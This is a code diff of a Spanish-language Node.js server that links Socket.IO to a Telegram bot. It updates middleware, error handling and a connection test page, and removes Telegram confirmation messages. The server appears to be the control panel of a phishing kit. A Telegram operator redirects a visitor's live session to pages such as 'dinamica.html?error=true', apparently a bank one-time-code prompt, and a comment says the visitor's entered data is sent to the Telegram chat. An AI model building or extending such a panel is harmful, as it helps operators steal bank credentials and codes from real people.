@@ -62,14 +62,17 @@ const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, {
   polling: false
 });
 
-// Middleware
-app.use(express.static(path.join(__dirname)));
+// ========================================
+// MIDDLEWARE
+// ========================================
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname)));
 
-// Log cuando Socket.IO sirve archivos
-app.use('/socket.io/', (req, res, next) => {
-  console.log(`🔌 Socket.IO request: ${req.method} ${req.url}`);
-  next();
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('❌ Error en request:', err);
+  res.status(500).json({ error: 'Error interno del servidor' });
 });
 
 // ========================================
@@ -438,7 +441,7 @@ class TelegramService {
           redirectUrl = 'dinamica.html?error=true';
         }
         
-        // Responder callback INMEDIATAMENTE
+        // Responder callback INMEDIATAMENTE (solo popup, sin mensaje)
         await this.bot.answerCallbackQuery(callbackQuery.id, { text: request.text });
         
         // Emitir redirección (SIEMPRE debe llegar)
@@ -452,29 +455,14 @@ class TelegramService {
           console.error(`❌ Socket se desconectó después de emitir redirección`);
         }
         
-        // Enviar mensaje de confirmación a Telegram (en background, no bloquear)
-        const confirmMessage = `✅ *Comando Ejecutado*\n\n${request.emoji} *Acción:* ${request.label}\n🆔 *Sesión:* \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_El usuario ha sido redirigido a ${request.page}_`;
-        
-        this.bot.sendMessage(this.chatId, confirmMessage, {
-          parse_mode: 'Markdown'
-        }).catch((error) => {
-          console.error('⚠️ Error al enviar confirmación:', error.message);
-        });
+        // NO enviar mensaje adicional - el nuevo mensaje con datos ya se enviará cuando el usuario responda
       }
 
     } else if (action === 'finalize') {
-      // Responder callback INMEDIATAMENTE
-      await this.bot.answerCallbackQuery(callbackQuery.id, { text: '🏁 Sesión finalizada ✅' });
-      
-      // Enviar mensaje final de confirmación (en background)
-      const finalMessage = `✅ *Sesión Finalizada*\n\n🆔 Sesión: \`${sessionId}\`\n⏰ ${new Date().toLocaleString('es-CO')}\n\n_Los datos han sido procesados correctamente._`;
-      
-      this.bot.sendMessage(this.chatId, finalMessage, {
-        parse_mode: 'Markdown'
-      }).then(() => {
-        console.log(`✅ Mensaje de finalización enviado`);
-      }).catch((error) => {
-        console.error('⚠️ Error al enviar mensaje final:', error.message);
+      // Responder callback con mensaje final
+      await this.bot.answerCallbackQuery(callbackQuery.id, { 
+        text: `🏁 Sesión ${sessionId} finalizada ✅`,
+        show_alert: false
       });
       
       // Limpiar referencias pero NO eliminar mensajes (mantener historial)
@@ -701,24 +689,80 @@ app.get('/health', (req, res) => {
 app.get('/test-socket', (req, res) => {
   res.send(`
     <!DOCTYPE html>
-    <html>
-    <head><title>Socket.IO Test</title></head>
+    <html lang="es">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Socket.IO Test</title>
+      <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
+        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        #status { padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .connecting { background: #fff3cd; color: #856404; }
+        .connected { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        pre { background: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; }
+      </style>
+    </head>
     <body>
-      <h1>Socket.IO Test</h1>
-      <div id="status">Conectando...</div>
+      <div class="container">
+        <h1>✅ Socket.IO Test</h1>
+        <div id="status" class="connecting">Conectando...</div>
+        <h3>Información de Conexión:</h3>
+        <pre id="info">Esperando conexión...</pre>
+      </div>
       <script src="/socket.io/socket.io.js"></script>
       <script>
-        const socket = io();
-        socket.on('connect', () => {
-          document.getElementById('status').innerHTML = '✅ Conectado! Socket ID: ' + socket.id;
-        });
-        socket.on('connect_error', (err) => {
-          document.getElementById('status').innerHTML = '❌ Error: ' + err.message;
-        });
+        const statusDiv = document.getElementById('status');
+        const infoDiv = document.getElementById('info');
+        
+        try {
+          const socket = io();
+          
+          socket.on('connect', () => {
+            statusDiv.className = 'connected';
+            statusDiv.innerHTML = '✅ Conectado exitosamente!';
+            infoDiv.textContent = JSON.stringify({
+              socketId: socket.id,
+              connected: socket.connected,
+              transport: socket.io.engine.transport.name,
+              timestamp: new Date().toISOString()
+            }, null, 2);
+          });
+          
+          socket.on('connect_error', (err) => {
+            statusDiv.className = 'error';
+            statusDiv.innerHTML = '❌ Error de conexión: ' + err.message;
+            infoDiv.textContent = 'Error: ' + err.toString();
+          });
+          
+          socket.on('disconnect', (reason) => {
+            statusDiv.className = 'connecting';
+            statusDiv.innerHTML = '⚠️ Desconectado: ' + reason;
+          });
+        } catch (error) {
+          statusDiv.className = 'error';
+          statusDiv.innerHTML = '❌ Error fatal: ' + error.message;
+          infoDiv.textContent = error.stack;
+        }
       </script>
     </body>
     </html>
   `);
+});
+
+// ========================================
+// MANEJO DE ERRORES GLOBAL
+// ========================================
+process.on('uncaughtException', (error) => {
+  console.error('❌❌❌ ERROR NO CAPTURADO:', error);
+  console.error('Stack:', error.stack);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('❌❌❌ PROMESA RECHAZADA NO MANEJADA:', reason);
+  console.error('Promise:', promise);
 });
 
 // ========================================
